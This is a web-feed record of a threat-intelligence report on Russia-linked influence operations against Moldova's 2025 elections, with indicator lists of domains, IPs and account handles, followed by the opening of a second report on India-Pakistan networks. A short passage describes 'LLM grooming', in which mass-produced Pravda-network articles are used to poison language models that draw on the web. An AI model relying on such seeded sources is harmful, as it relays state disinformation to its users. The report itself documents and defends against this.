non-credible, long-form investigative reporting to accuse prominent international opposition leaders, particularly during major election cycles, of serious criminal activities, including terrorism, electoral fraud, human trafficking, and sexual abuse of minors. These reports are then laundered through a network of pro-Russian influencers and websites previously identified as promoting Kremlin propaganda, such as Jamie McIntyre’s Australian National Review (ANR, australiannationalreview[.]com ​), the London Times (londontimes[.]live), and Veterans Today (VT, vtforeignpolicy[.]com).\nR-FBI was founded and initially financed in 2021 by deceased Russian oligarch Yevgeny Prigozhin, although management of the organization has since been transferred to Oksana Vovk, known now as Mira Terada. Based on Insikt Group investigations, in addition to public reporting from researchers at Clemson University and VIGINUM, R-FBI is also closely involved with a separately tracked Russian IO we refer to as CopyCop (Storm-1516).\nNarratives\nBetween late May and mid-June 2025, R-FBI published two investigative articles accusing President Sandu of engaging in illicit activities and political corruption schemes (Figures 13 and 14, below). On May 31, 2025, VT republished an R-FBI article claiming President Sandu and “affiliated organizations” were trafficking Ukrainian orphans, “under the pretext of medical treatment and adoption” into the “hands of pedophile networks and sexual slavery” across Europe. A separate article, republished by VT from R-FBI on June 19, 2025, claimed President Sandu and political allies earned “at least $4.5 billion” via large-scale illicit schemes involving “drug trafficking, Ukrainian weapons, and modern slavery.” Both articles were written by Brazilian R-FBI contributor Lucas Leiroz, also tracked as an amplifier of CopyCop content. Leiroz has previously authored numerous articles featured in Russia state-sponsored media outlets, as well as in outlets previously assessed as associated with Russian intelligence, such as InfoBrics (BRICS Portal) and the Strategic Culture Foundation.\nFigures 13 and 14: R-FBI investigative pieces republished in VT; these articles are later used as citations in social media (Source: VT [archive one, archive two])\nOn July 1, 2025, R-FBI published a third investigative article on Moldova, claiming President Sandu had signed a “secret decree” dated June 4, 2025, allowing law enforcement to “kill citizens without fear of punishment.” The decree, according to R-FBI, was a deliberate decision to “suppress the expected mass protests in the fall of 2025, caused by the economic crisis and expected accusations of election fraud.” R-FBI provided an alleged copy of the decree (classified as Nr. 224-S-X), which Insikt Group found no record of on the official website of the President of Moldova. R-FBI attempted to mitigate this discrepancy by stating in its article that the document was obtained from anonymous sources in the president’s office. Additional scrutiny of the document image, particularly its off-center header and incorrectly aligned Article 2, leads Insikt Group to assess the document as very likely a forgery intended to damage President Sandu’s credibility and undermine the president’s anti-corruption platform.\nFigure 15: A very likely forgery of a Moldovan presidential decree providing immunity to law enforcement for the use of force against protestors and instances of civil unrest (Source: R-FBI [archive])\nInfrastructure\nLikely due to the result of social media platforms’ shadowbanning direct links to R-FBI’s website, fondfbr[.]ru, R-FBI is almost certainly using secondary sources through a network of intermediaries and influencers to launder its investigations, namely via VT, but also via websites associated with ANR. Insikt Group also located limited secondary and tertiary amplification through the pro-Kremlin media publication EurAsia Daily (EADaily) and a fringe Swedish publication that sporadically re-publishes R-FBI investigative pieces called “Bakom Kulisserna” (“Behind the Scenes”).\nPro-Kremlin social media personalities who have previously amplified CopyCop content are almost certainly also the leading amplifiers of R-FBI’s anti-Sandu articles, resulting in each claim receiving hundreds of thousands of social media views. In addition to Leiroz, these individuals included Chay Bowes, Raphael Machado, and social media personalities “Johnny Midnight”, “Peacemaker”, and “Sprinter Observer”. The extent of R-FBI article amplification against President Sandu is a Category 3 on the Brookings Breakout Scale, consisting of multiple platforms with multiple breakouts. Similar to Operation Overload, R-FBI has achieved isolated instances of Category 4 amplification, given the numerous prior press coverage of R-FBI and its fabricated investigative pieces.\nFigures 16 and 17: Screenshots of Chay Bowes and Johnny Midnight posts discussing R-FBI’s story republished in VT\n(Source: Social media)\nFigures 18 and 19: R-FBI articles republished to EADaily and Bakom Kulisserna (Source: archive one, archive two)\nOperation Undercut Targets Moldovan TikTok Users\nIn early June 2025, Insikt Group identified a series of TikTok accounts promoting anti-PAS, anti-Sandu content in Romanian, which we currently attribute to Operation Undercut. Over the course of this investigation, we identified an additional network of approximately 70 active social media accounts (as of late June 2025) posting this content in parallel to accounts on TikTok (Appendix A). We note that many of these accounts have since been suspended; however, we continue to identify replacement accounts on a rolling basis.\nOperation Undercut is an IO almost certainly conducted by the Russian company Social Design Agency (Агентсво Социального Проектирования, or “SDA”) since at least December 2023. Historically, Operation Undercut has generated very little online engagement and very likely has achieved minimal impact on its target audiences. Previously, Insikt Group observed Operation Undercut primarily using inauthentic social media and 9gag accounts likely operated by humans or simulating human activity, which includes posting during typical Moscow workday hours and halting activity during major Russian holidays.\nNarratives\nOperation Undercut is very likely attempting to condition domestic Moldovan audiences to expect rigged elections in favor of PAS, stoke fears of a potential conventional war with Russia, and provoke economic concerns by magnifying priority economic issues for voters, such as inflation, agricultural collapse, and child-welfare costs. This network of Operation Undercut accounts consistently publishes content that is generally negative toward the PAS and President Sandu. Themes include framing Moldova’s EU aspirations as economically ruinous, amplifying likely non-credible claims of alleged Moldovan political corruption, and predicting a future socio-political collapse should Moldova continue its current trajectory.\nInfrastructure\nInsikt Group identified at least four Operation Undercut TikTok accounts attempting to impersonate Moldovan citizens or Romanian-speaking individuals in Eastern Europe. One account, “Bella Popescu”, claimed to be a photographer and film editor. The second account, “dorinrobu5”, dedicated its account to “news,” “reviews,” and “relevant, fresh information.” The third account, “Gergely Dezir”, described itself as an account dedicated to “peace and politics.” A fourth account we assess as likely part of the network, “moldova457u”, began posting similar Operation Undercut-style AI-generated videos in late June 2025. Each of the TikTok videos we observed stated in their descriptions that the videos were constructed using CapCut, a video editing software popular with video creators and social media influencers. This network is also very likely using VEED’s “Gen-AI studio” avatars, “Aisha”, “Elena”, and “Marcus”, to periodically narrate and lend credibility to Operation Undercut content.\nFigure 20: Operation Undercut using Veed avatar “Elena” to narrate anti-Sandu, anti-PAS video on social media\n(Source: Social media)\nEach of the clips posted to TikTok contains hashtags very likely chosen to garner potential viewers interested in Moldova and Moldovan politics (#stirimoldova, #moldovaștiri, #UE), as well as generalized hashtags used to reach a broader audience, such as #TikTokNews, #Trump2020, and #gaza. The posts’ associated captions, however, reflect an anti-EU perspective and are consistent with pro-Russian messaging targeting domestic audiences that seeks to erode trust in Western institutions and sow disillusionment with European alignment.\nCompared to the curated TikTok accounts, the secondary network of social media accounts we identified on mainstream social media contained usernames incorporating Indian, Bangladeshi, and Sanskrit names and posted content in Romanian. Several of these accounts also held verified badges, indicating that their administrators had paid for premium features on the social media platform. After these accounts were suspended by the platform, replacement accounts with Western names, still posting in Romanian, took their place in late June 2025. Based on rolling platform suspensions and the emergence of new accounts, Insikt Group assesses that the administrators of Operation Undercut will likely continue attempting to establish a persistent presence on social media.\nAlthough these accounts did not have a notable following, we observed the network persistently attempting to engage in hashtag hijacking to increase the visibility of its posts to wider audiences. To do so, Operation Undercut almost certainly continues to engage in localized hashtag use to identify and hijack trending hashtags among Romanian-speaking audiences in Moldova, very likely using commercial off-the-shelf social media monitoring tools. While the accounts do regularly achieve more than 100 views per post, we have not observed any meaningful engagement with broader audiences. However, viewership statistics of Operation Undercut activity on TikTok specifically indicate that the posts regularly receive thousands of views each; one post from Bella Popescu calling on President Sandu to resign garnered more than 113,000 views.\nFigure 21: Four TikTok accounts Insikt Group attributes to Operation Undercut\n(Source: TikTok [archive one, archive two, archive three, archive four])\nFigures 22 and 23: Sample Operation Undercut-operated social media accounts, now suspended (Source: Social media)\nAlthough the operation continues to fail in its attempts to significantly impact public opinion, it likely has improved its online engagement since our prior investigation through its expanded social media use on TikTok. Operation Undercut activities are currently a Category 2 on the Brookings Breakout Scale, consisting of a multiplatform operation with no recorded breakout beyond the network.\nFacebook Pages Linked to Ilan Shor and “Evrazia”\nIn May 2025, Moldova-based think tank WatchDog.MD published a report highlighting 146\nanonymous Facebook Pages it determined to be affiliated with fugitive Moldovan oligarch Ilan Shor, and used to promote pro-Shor political advertisements, in addition to another 315 “stand-by” pages. In all, WatchDog.MD identified this network as part of a larger network consisting of 2,167 auto-generated Facebook pages created to “influence political processes in the Republic of Moldova and other European states.” Many of these pages have randomly generated names, incorporating photos later found to have been stolen from Eastern European dating websites. WatchDog.MD attributed this activity to Russia-based actors.\nNarratives\nWatchDog.MD’s preliminary investigation determined that networks of anonymously operated Facebook pages running commercial advertisements and likely connected to Shor presented themselves as media or news pages with patriotic names similar to other Moldova-related pages Meta disclosed in October 2024, such as “Authentic Moldova”, “Today’s Chișinău”, “Гагаузия вперед” (“Gagauzia Forward”), “Moldova вперед” (“Moldova Forward”), “My Dream Moldova”, “Orhei Today”, and others. Posts and paid ads praise Ilan Shor and Shor-managed organizations, such as “A New Life”, the “National Salvation Committee”, and the “Movement for the People”, while labelling PAS as corrupt or incompetent. WatchDog.MD indicated that between October 2022 and November 2024, Shor spent nearly 470,000 euros across over 1,400 Facebook advertisements, cautioning that the “actual amount may be even higher.”\nInfrastructure\nAutomated infrastructure very likely powers the entirety of the miscellaneous pro-Shor Facebook Pages. WatchDog.MD traced 2,167 Facebook pages built from randomly concatenated keyword strings (“Gourmet Gurus Crafty Creations Motivational Moments”, “Travel Junkies Business Builders Neighborhood News”, or “WealthWave Innovations”), with dozens of clones sharing the exact same title. Profile photos are likely misappropriated from Eastern European dating and “cam sites,” and the same images frequently resurface across multiple page aliases. Early iterations of the network were openly administered from the Philippines, Vietnam, Timor-Leste, and the United Arab Emirates (UAE), with ads paid in USD or Polish zloty, indicators which WatchDog.MD used to attribute the network as operating outside Moldovan jurisdiction.\nFigure 24: Example placeholder “WealthWave Innovations” Facebook Pages; Insikt Group found that similar pages were sponsoring advertisements for Ilan Shor-backed Evrazia’s “Discover Russia 2025” program (Source: Facebook)\nInsikt Group’s independent review found that in mid-May 2025, the majority of these Facebook Pages remained dormant, with little information from which to discern plans of potential future activity or planned purposes. We did find, however, that several of the previously mentioned WealthWave Innovations-named pages were advertising a “Discover Russia 2025” program, facilitated by the Shor-backed Russian NGO “Evrazia.” In October 2024, the Organized Crime and Corruption Reporting Project (OCCRP) concluded that Evrazia was bribing Moldovan citizens to vote against the EU referendum. In all, OCCRP stated that $15 million USD in illegally transferred funds from Evrazia was used to attempt to bribe 130,000 voters to vote against the referendum, organized through Telegram. Shor reportedly argued he was engaging in legal activity, stating he was paying Moldovans “salaries” in return for their work in “explaining to people the advantages of the Eurasian economic space.”\nFigure 25: Now-inactive Facebook ads from mid-May 2025 from “WealthWave Innovations” advertising Shor-backed “Evrazia” and its “Discover Russia 2025” program (Source: Facebook Ad Library).\nFigure 26: An “about us” page highlighting Evrazia’s “Discover Russia 2025” program\n(Source: Evrazia[.]su [archive])\nRussian State Media Provides Infrastructure Support to Pro-Kremlin Moldova24\nSince February 2025, Insikt Group has tracked the growth of Moldova24 (MD24), a Russia-based and likely Kremlin-backed television network geared toward Russian-speaking individuals living in Moldova. MD24’s Russian connections and attempts to reshape opinion in Moldova were first detailed during the October 2024 election cycle when the Security and Intelligence Service of Moldova (SIS) ordered national internet service providers (ISPs) to block two of MD24’s primary news domains, moldova24[.]online and pwa[.]moldova24[.]online. Moldovan authorities later also blocked Telegram accounts belonging to Russian oligarch Shor, which included Telegram accounts associated with MD24.\nFigure 27: Moldover24’s home page featuring a 24/7 livestream of the network (Source: MD24 [archive]).\nNarratives\nMD24 launched in September 2024 with the almost certain aim of influencing Moldovan public opinion among Russian speakers favorably toward pro-Russian policies and a closer diplomatic relationship with Moscow. MD24 news articles and its 24/7 broadcast platform, which are hosted on its core website, moldova-24[.]online, frequently criticize Western policies, highlight Moldova’s economic difficulties, and question the West's motives in deepening its ties with Moldova. MD24 news coverage often includes biased reporting, emotional language, and selective coverage, and very likely seeks to promote skepticism toward Western institutions, particularly the EU and the US.\nAn emerging theme emanating from MD24, consistent with shared narratives from pro-Kremlin sources, is to undermine public confidence in Moldova's electoral process and the credibility of PAS specifically. MD24 has published multiple articles promoting skepticism, distrust, and suspicion regarding Moldova’s voting procedures with the diaspora vote, which accounted for one-fifth of the total vote during the October 2024 election and leans heavily toward Sandu. MD24 has amplified allegations of intended or planned electoral fraud among diaspora voters, asserting a deliberate PAS strategy to artificially inflate votes from abroad. Simultaneously, MD24 claimed PAS was intentionally discriminating against or otherwise suppressing pro-Russia Moldovan voters, specifically those residing in Russia and Transnistria. Domestically, MD24 published articles suggesting PAS was intimidating opposition figures and, with help from the EU, sought to bribe the electorate in order to win votes.\nFigure 28: MD24 articles published in mid-June 2025 suggesting plans of voter fraud emanating from foreign ballot stations\nin support of PAS (Source: MD24 [1, 2, 3]).\nInfrastructure and State-Sponsored Support\nInsikt Group assesses that Russia's state-sponsored media outlet RT has very likely supported the development of MD24 through covert means. This includes actively hosting its website and website mirrors through IP space that is not currently directly associated with RT or its parent organization, RIA Novosti, but is the same IP space that hosted RT content dating back more than five years, in addition to content created by RT personnel. Furthermore, it is likely that RT personnel supported the launch of MD24 and its ongoing operations through physical means, such as providing suitable studio space in Moscow, equipment, and possibly guidance on broadcast operations. MD24 is also likely under RT’s editorial influence, using minimal direct citations between the organizations to maintain a veneer of independence despite clear ties to shared infrastructure.\nIn February 2025, Insikt Group provided Recorded Future customers with a Threat Actor Profile of MD24 and its connections to Russian state media infrastructure, several months ahead of findings published by other research groups. Independent public reporting from the Atlantic Council’s DFRLab in June 2025 corroborates our initial findings of MD24 as largely supported by the Russian government and pro-Kremlin actors. According to Insikt Group’s investigation, MD24 was available in more than a dozen domains initially hosted at the Russia-based IP address 91[.]218[.]228[.]51, owned by AS210079, which is operated by Eurobyte LLC. This has since been updated to a different Eurobyte-owned IP address, 95[.]181[.]226[.]185, as of July 2025.\nDomain\nCreate Date\nmoldova24[.]space\n2024-07-17\nmoldova24[.]press\n2024-07-17\nmoldova-24[.]online\n2024-07-17\nmoldova24[.]online\n2024-07-17\nmoldova24[.]org\n2024-07-17\nmoldova-24[.]live\n2024-07-17\nmldvideo24[.]space\n2024-09-11\nmldvideo24[.]tech\n2024-09-11\nmldvideo24[.]site\n2024-09-11\nmldvideo24[.]online\n2024-09-11\nmldvideo24[.]pro\n2024-09-11\nnewseday[.]site\n2024-10-08\npremiumlive[.]site\n2024-10-08\nnlive-24[.]online\n2024-10-08\nnlive24[.]ru\n2024-10-08\nTable 1: MD24-associated domains (Source: Recorded Future)\nRT is very likely to have covertly supported the administration of these domains, based on historical registration data indicating shared infrastructure between MD24 and RT-affiliated websites. Most of these domains do not rely on RT’s or typical affiliated DNS infrastructure (nsX[.]rttv[.]ru, nsX[.]sputniknews[.]ru, nsX[.]rian[.]ru), nor do they display registration details linked to ANO TV-Novosti or Rossiya Segodnya, which are typically associated with RT and its affiliates. Some of these websites include:\npoiskblizkih[.]com (an RT database to reconnect Donbas families impacted by Russia’s war against Ukraine)\nputinspeaks-rt[.]com\nRTdoc[.]tv (a website for RT Documentary content launched in early June 2024, very likely to coincide with the 2024 International Documentary Film Festival)\nktech[.]team — notably, ktech[.]team belongs to KTEX, an organization that advertises various IT solutions, and its Taxpayer Personal Identification Number (INN), 9710109376, is registered to Sergei Kukota, director of RT Balkan\nBeyond its network of websites, MD24 also maintains YouTube and TikTok accounts used to share its various news segments.\nFigure 29: MD24’s active TikTok channel (Source: TikTok [archive])\nFigure 30: MD24’s most recent YouTube channel (Source: YouTube [archive])\nIn addition to the above, Insikt Group identified both active Facebook and Instagram accounts affiliated with MD24 that ran more than 210 Meta advertisements combined between mid- and late June 2025 (According to the Ad Library, this number is approximately 440 total advertisements as of August 2025). Based on available data of more than 300 advertisements, Insikt Group can estimate that as of August 2025, MD24 advertisements have reached at least six million impressions since June 2025 –– reflecting the number of times the ad was displayed on a screen, which may include multiple views by the same person –– the majority of which were reportedly located in Chișinău, Gagauzia, and Transnistria, per Meta’s Ad Library. The majority average payment per advertisement reportedly was less than 100 euros.\nMD24’s Facebook account, used to sponsor political advertisements and post MD24 news content, launched March 29, 2025, initially under the name “Frumusețea Pământească SPO” (“Earthly Beauty SPO”) before updating with the name “Moldova24” and MD24 graphics. Its associated Instagram account has the handle @alinanorman9, despite using MD24 graphics, and exclusively posts MD24 news segments. This account is likely a disposable profile used entirely for hosting posts that will be used as ads on Instagram.\nFigure 31: MD24’s likely throwaway Instagram account used for Meta advertisements (Source: Instagram [archive])\nThe Instagram-specific ads included hashtags such as #moldova, #md24, and a number, which, based on @alinanorman9’s posts, indicates its position in a series of internally tracked numbered ads. The advertisements on Facebook included captions such as “People support Hutsul,” “PAS is a gathering of impostors,” “Sandu humiliated the children of Gagauzia,” and “Moldova will be better off without PAS.” Per Meta policy for political advertising, the administrators were required to provide additional contact information; Insikt Group found that they had used disposable contact information, including the email address jasonrobertson1978[@]antimmail[.]com.\nFigure 32: MD24 Facebook account used to run Meta advertisements (Source: Facebook Ad Library)\nFigure 33: A sample of MD24-run Instagram ads in late June 2025 (Source: Facebook Ad Library)\nPortal Kombat Presses On in Moldova\nPortal Kombat is a Russia-aligned influence network targeting international audiences with pro-Kremlin influence content, aggregated primarily through networks of websites, most notably its “Pravda” ecosystem of hyper-localized websites. Its flagship website in Moldova, md[.]news-pravda[.]com (Pravda MD) is a fully automated news aggregator that systematically scrapes and republishes articles, posts, and official communications from a curated list of pro-Kremlin sources ranging from Russian partially or wholly state-controlled media outlets, such as RT, Sputnik, Pravda[.]ru, TASS, and RIA Novosti. The network also republishes official press releases and communications from Russian government ministries, local administrations, and other state institutions, and regularly republishes commentary from pro-Russian Telegram sources and pro-Kremlin “bloggers.”\nFigure 34: Most frequently cited sources for over 151,000 articles published on Pravda MD, md[.]news-pravda[.]com\n(Source: Pravda Dashboard via CheckFirst)\nNarratives\nPravda MD very likely functions as a high-volume amplification node that launders Russian state media and other pro-Kremlin narratives to Romanian-speaking audiences in Moldova. The website and broader Portal Kombat sources do not produce original reporting, but rather republish content plagiarized from the above-mentioned, Russia-aligned sources. The content from these sources consistently questions President Sandu’s credibility, anti-corruption measures, and PAS’s broader political platform. Likewise, these sources erode support for EU integration and attempt to further drive social fragmentation while laying the groundwork to delegitimize Moldova’s September 2025 parliamentary elections should the Kremlin view the results as unfavorable.\nNotably, Pravda MD, in line with Russia’s broader objectives, very likely seeks to exploit Moldova's internal ethnic and regional fault lines, particularly in the autonomous region of Gagauzia and the Russia-controlled breakaway region of Transnistria. Insikt Group further assesses that the underlying goal is to fuel separatism, undermine the authority of the central government in Chișinău, and create internal crises that Russia can leverage in pursuit of drawing Gagauzia and Transnistria closer into Russia’s geopolitical orbit. Further, according to the European Council on Foreign Relations (ECFR), citing a May 2025 interview with a high-ranking Moldovan government official, Pravda MD and the Pravda ecosystem at large were assessed as being used as a tool in Russian attempts to engage in the “online penetration of the [Moldovan diaspora].”\nFigure 35: A July 2, 2025, Pravda MD article featuring Victory Bloc member Yuri Vitnyansky arguing that if “PAS wins the elections, Moldova will face a massive psychological fall and a new wave of migration” (Source: Pravda MD [archive])\nFigure 36: A July 2, 2025, Pravda MD article originally published by Sputnik News Moldova, blaming PAS for Moldova’s “burdensome tax regime” (Source: Pravda MD [archive])\nInfrastructure\nThe European External Action Service (EEAS), in its third Report on Foreign Information Manipulation and Interference Threats, highlighted three Portal Kombat domains created to target both Russian and Romanian-speaking audiences in Moldova, md[.]news-pravda[.]com, moldova[.]news-pravda[.]com, and the now-defunct pravda-md[.]com. The outlet also maintains a Telegram channel; however, the subscriber account currently only has nineteen subscribers.\nDespite the volume of generated articles, Pravda MD’s viewership is likely low; Similarweb statistics indicated that md[.]news-pravda[.]com only received 86 visits in April 2025. In comparison, its host page, news-pravda[.]com, received more than 365,500 website visits, with over 42% of its social media traffic originating from Reddit. It is possible that these page views are cumulative across all of Pravda’s localized webpages.\nWhile the results of Pravda’s website viewership are mixed, there are broader concerns about the volume of content created by the network potentially poisoning secondary sources, particularly large-language models (LLMs) with access to the internet. Joint research by DFRLab and CheckFirst found hyperlinks to Pravda-network domains on Wikipedia rose sharply after February 24, 2022, reaching 1,907 links on 1,672 pages in 44 languages; specific Moldova-related content at the time of the analysis was limited. The same study counted more than 3.7 million Pravda articles on the open web. Analysis from The American Sunlight Project (ASP) categorizes this technique as “LLM grooming.” Without remediation, ASP argued, LLM grooming “poses a growing threat to the integrity and reliability of the open internet.”\nAccording to Recorded Future data, we identified at least one occasion in which a Portal Kombat domain was cited as a source in a mainstream news report; however, due to numerous investigative pieces highlighting the Pravda ecosystem, we therefore assess that Portal Kombat’s typical breakout scores no higher than a Category 4 on the Brookings Breakout Scale.\nMitigations\nCustomers can use the Recorded Future Intelligence Operations Platform to track each of the IOs discussed in this report, including Insikt Group coverage of these operations’ emerging narratives, tactics, techniques, and procedures, which is provided with access to the Recorded Future Geopolitical Intelligence module.\nTo minimize unintended amplification of IOs, media and research organizations should archive infrastructure to preserve forensic evidence without boosting visibility and reach, and strip viral content of engagement-boosting elements, such as hyperlinks, hashtags, or other media.\nOrganizations deploying public-facing AI chatbots or other large-language models should integrate multilayer content-filtering frameworks that block or flag inputs from domains linked to known IOs.\nImpersonated entities, particularly media organizations, should continue engaging with social media companies and domain registrars to seize or remove content impersonating their brand, or leverage services provided by Recorded Future to request takedowns of brand impersonation attempts.\nOutlook\nAs the September 28, 2025, parliamentary elections approach, Insikt Group assesses that Russia-linked IOs, including both the well-documented networks discussed in this report and any newly emerging ones, will very likely scale up in volume. Insikt Group assesses that these operations are likely less intended to secure a clear pro-Russian majority than to decrease voter turnout, particularly among the diaspora vote, fracture the pro-European bloc, and cast doubt on the legitimacy of the result should such a result be unfavorable to Russia’s foreign policy objectives. International-facing IOs, coupled with coordinated intimidation of diaspora voters through polling place bomb-threat hoaxes and narratives discrediting overseas voting — mirroring Moldova’s 2024 presidential election — are very likely poised to suppress a constituency that historically tilts strongly toward PAS.\nIn conjunction with IOs, Moscow will very likely use other forms of Russian hybrid warfare aimed at coercing Moldovan voters, building off recent operations. Gazprom’s winter gas cut-offs, previous targeted cyberattacks against the Central Election Commission, a documented surge in Russia-attributed cyber intrusions against Moldova’s 2024 election cycle, and intelligence warnings of a manufactured crisis in Transnistria and Gagauzia all signal a readiness to amplify economic hardships and security anxiety in Moldova in the hope of tilting the balance of the election in the Kremlin’s favor.\nCurrent polling still shows PAS leading by a margin large enough to form a governing bloc, and Chişinău has invested heavily in cyber defense, energy diversification, and enhanced, robust policing. These resilience measures make a decisive electoral victory in favor of the Kremlin unlikely. Nevertheless, even in the wake of an election result perceived by the Kremlin as unfavorable, Russia may pivot toward more overt destabilization activities aligned with its broader Russkiy Mir objectives, such as inciting protest violence in Russian-speaking regions like Gagauzia and Transnistria, or exploiting regional instability to further consolidate territorial control consistent with its post-Soviet reunification ambitions.\nAppendix A: Key Infrastructure Observed\nOperation Undercut Social Media Handles\nUsername\nUsername\nUsername\n@aaron2492397222\n@hubbard_tr92086\n@narendr_jha_bjp\n@aashish89412892\n@JamesSanto1236\n@narndracau25254\n@abhinav26016456\n@JenkinS_ma18433\n@parvath91347591\n@abdulrishw69623\n@JenniferCh71251\n@prakash89572935\n@amanata29439662\n@JennyMoral62877\n@rahulya84430659\n@ankurku92150874\n@JessicaGra66820\n@rheanne_ray\n@arshad_kha84022\n@JessicaWil17885\n@rosycbaceliscup\n@arunkum39770895\n@JohannaSch8460\n@sanjayntr390637\n@babukunwar42806\n@JosieGarci18643\n@sapanKumar45713\n@biliyammin22977\n@JoyTolbert43178\n@shashan61123435\n@biswajitro66312\n@kailash83156331\n@shn137868620033\n@brajesh13093657\n@kamalra95279010\n@shivroy59777988\n@chaudhary994634\n@karanda64037678\n@shyamve56056624\n@deepakk93394418\n@KarenGomez50540\n@sonusonu1742479\n@durgesh48781019\n@ku06710639kumar\n@sumanmonda48516\n@ErinC72794\n@LeonardMeled\n@sureshsain69613\n@GK1162734028895\n@luthufudde71703\n@sunilkU77153523\n@Heather74361771\n@manishjakh33860\n@sunnykumar61603\n@HeathercargP\n@mary_hoove91159\n@vishallodh41892\n@HeatherKni89545\n@mdrased46668391\n@zh9409061564695\n@hilton_amb93231\n@mhmdrdfan695975\n\n          \n@HopeBrown565188\n@moideen33629186\nFoundation to Battle Injustice\nDomain\nfondfbr[.]ru\nvtforeignpolicy[.]com\neadaily[.]com\nlondontimes[.]live\nbakomkulisserna[.]info\nRT- and MD24-Affiliated Domains Hosted on 95[.]181[.]226[.]185\nDomain\nDomain\nDomain\nahilesva[.]info\nmldvideo24[.]pro\nnews-365[.]ru\nartel[.]watch\nmldvideo24[.]site\nnewseday[.]site\narteldoc[.]com\nmldvideo24[.]space\nnlive-24[.]online\narteldoc[.]tv\nmldvideo24[.]tech\nnlive24[.]ru\nbook-catalog[.]ru\nmoldova-24[.]live\npoiskblizkih[.]com\ngatewaytorussia[.]ru\nmoldova-24[.]online\npremiumlive[.]site\ngreen-box-tv[.]com\nmoldova24[.]online\nputinspeaks-rt[.]com\ngw2ru[.]com\nmoldova24[.]org\nrtdoc[.]tv\nkanzlerdaddy[.]ru\nmoldova24[.]press\nrteam[.]tech\nkhangar[.]net\nmoldova24[.]space\nrtred[.]online\nktech[.]team\nmsimonyan[.]ru\nxn--80aaglo1cmx[.]xn--p1ai\nmldvideo24[.]online\nnavalny[.]lol\n\n          \nPortal Kombat’s Pravda MD\nDomain\nmd[.]news-pravda[.]com\nmoldova[.]news-pravda[.]com\npravda-md[.]com","enclosure":{"length":"0","type":"image/jpg","url":"https://www.recordedfuture.com/research/media_17f955e967d0426875aff510d4c6f80095124aa6f.gif?width=1200&format=pjpg&optimize=medium"},"content":"Ahead of Moldova’s 2025 elections, Russia-linked influence operations seek to undermine EU integration, discredit President Sandu, and destabilize democratic processes through coordinated disinformation campaigns and hybrid tactics.","contentSnippet":"Ahead of Moldova’s 2025 elections, Russia-linked influence operations seek to undermine EU integration, discredit President Sandu, and destabilize democratic processes through coordinated disinformation campaigns and hybrid tactics.","guid":"https://www.recordedfuture.com/research/russian-influence-assets-converge-on-moldovan-elections","categories":["Research (Insikt)"],"isoDate":"1970-01-21T08:00:57.000Z","tag":"intel"},{"title":"Influence Operations and Conflict Escalation in South Asia","link":"https://www.recordedfuture.com/research/influence-operations-and-conflict-escalation-in-south-asia","pubDate":"Wed, 21 Jan 1970 07:59:31 GMT","content:encoded":"\n        <h2>Executive Summary</h2>\n        <p>Insikt Group documented two large-scale, state-aligned influence operation networks supporting India and Pakistan, respectively, during the India-Pakistan conflict of April and May 2025; we track these networks as Hidden Charkha (pro-India) and Khyber Defender (pro-Pakistan). These networks are very likely motivated by patriotism and are almost certainly aligned with India’s and Pakistan’s domestic and foreign policy objectives, respectively. Both networks intervened at every phase of conflict escalation between the April 22, 2025, Pahalgam terror attack and the ceasefire announcement on May 10, 2025, presenting a blueprint of the TTPs and narratives employed by two separate influence operation networks supporting adversarial, nuclear-armed countries attempting to control escalation and garner popular and diplomatic support for limited conventional kinetic actions.</p>\n        <p>Each network consistently attempted to frame India or Pakistan, respectively, as maintaining superior technological and military capabilities –– and therefore the implied ability for each respective country to exercise tactical restraint –– as proof of having the moral high ground, and hence having domestic and international support. The networks also attempted to undermine India’s and Pakistan’s claims of military preparedness by amplifying forged military documents and exaggerating the impact of claimed cyberattacks to highlight vulnerabilities.</p>\n        <p>Despite their efforts, both networks were almost certainly unsuccessful in shaping public opinion, as measured by their lack of organic engagement on social media, their inability to break out of patriotic echo chambers, and their recurrent use of generative AI to produce visual content, which very likely undermines their credibility. Nevertheless, analyzing narratives produced by both networks can provide defenders with valuable insights into the role of influence operations (IOs) during conflict escalation. Organizations operating in conflict zones should proactively track mentions of their brand or key personnel in influence narratives to proactively mitigate against reputational damages.</p>\n        <h2>Key Findings</h2>\n        <ul>\n          <li>Hidden Charkha is a pro-India network active since at least 2021 that is almost certainly aligned with the Indian government and operating in the Indian Standard Time (IST) timezone. Khyber Defender is a pro-Pakistan network active since at least 2020 that is almost certainly aligned with the Pakistani government.</li>\n          <li>Both networks were active during the India-Pakistan conflict following the Pahalgam terror attacks on April 22, 2025, and very likely attempted to support the governments of India and Pakistan, respectively, at different phases of conflict escalation.</li>\n          <li>Initially, both networks attempted to stake claims and counterclaims to attribute the Pahalgam attacks as acts of state-sponsored terrorism from India or Pakistan. The networks then attempted to undermine senior political figures in each country, in addition to amplifying nationalist and patriotic sentiment domestically while suppressing dissenting opinions on social media.</li>\n          <li>Hidden Charkha and Khyber Defender closely supported and criticized each country’s kinetic military operations (Operation Sindoor and Operation Bunyan-Al-Marsous, respectively) and claimed each respective country was demonstrating tactical restraint and technological superiority.</li>\n          <li>Following the ceasefire announcement on May 10, 2025, Hidden Charkha accused Pakistan, and Khyber Defender accused India, of violating the ceasefire, as both networks attempted to shape international perceptions on the outcome of the conflict and reassert claims of technological superiority.</li>\n        </ul>\n        <h2>Two Networks</h2>\n        <p>Insikt Group identified two major influence networks engaging in coordinated inauthentic behavior (CIB) during the India-Pakistan conflict in late April and early May 2025: Hidden Charkha, a pro-India network, and Khyber Defender, a pro-Pakistan network (Figure 1). These networks illustrate how influence operations can be employed symmetrically during crises in an attempt to shape public perception in both domestic and foreign spheres, as well as in an attempt to manage escalation. Their behavior during the 2025 India-Pakistan standoff serves as a rare example of influence operations operating in tandem with kinetic and cyber escalation between rival nuclear-armed states. It also demonstrates the role of patriotic sentiment in aligning non-state influence actors with nation-state wartime objectives.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1a3e6c9399d1ee2bbb1cd9f0e836cdd0f1d0ebdd6.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1388\" height=\"807\" />\n            </div>\n          </div>\n          <div>\n            <div><strong>Figure 1:</strong> Hidden Charkha and Khyber Defender network graphs (Source: Recorded Future)</div>\n          </div>\n        </div>\n        <p>Both networks very likely operate to support and amplify pro-India and pro-Pakistan narratives on social media. These networks mainly promote pro-government messaging to domestic audiences in local languages and have seen sharp increases in activity during major domestic political events in each country (<strong>Figure 2</strong>). Hidden Charkha activity surged in November 2024 to commemorate the November 26, 2008, terrorist attacks in Mumbai; it also surged in January 2024 during <a 